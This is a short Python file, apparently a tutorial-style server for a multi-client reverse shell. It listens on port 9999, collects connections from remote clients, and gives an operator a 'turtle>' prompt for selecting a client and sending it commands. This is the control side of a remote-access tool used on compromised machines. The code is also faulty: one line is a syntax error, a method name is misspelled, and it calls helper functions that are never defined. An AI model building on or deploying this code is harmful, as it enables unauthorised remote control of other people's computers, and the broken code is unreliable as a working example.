import socket
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# Create socket
def socket_create():
	try:
		global host
		global port
		global s
		host = ""
		port = 9999
		s = socket.socket()
	except socket.error as msg:
		print("Socket creation error: " + str(msg))

# Bind socket to port and wait for connection from client
def socket_bind():
	try:
		global host
		global port
		global s
		print("Binding socket to port: " + str(port))
		s.bind((host, port))
		s.listen(5)
	except socket.error as msg:
		print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
		socket_bind()

# Accept connections from multiple clients and save to list
def accept_connections():
	for c in all_connections:
		c.clolse()
	del all_connections [:]
	del all_addresses [:]
	while True:
		try:
			conn, address = s.accept()
			conn.setblocking(1)
			all_connections.append(conn)
			all_addresses.append(address)
			print("\nConnection has beemn established: " + address[0])
		except:
			print("Error accepting connections")

# Interactive prompt for sending commands remotely
def start_turtle():
	while True:
		cmd = input('turtle>')
		if == 'list':
			list_connections()
		elif 'select' in cmd:
			conn = get_target(cmd)
			if conn is not None:
				send_target_commands(conn)
		else:
			print("Command not recognized")
		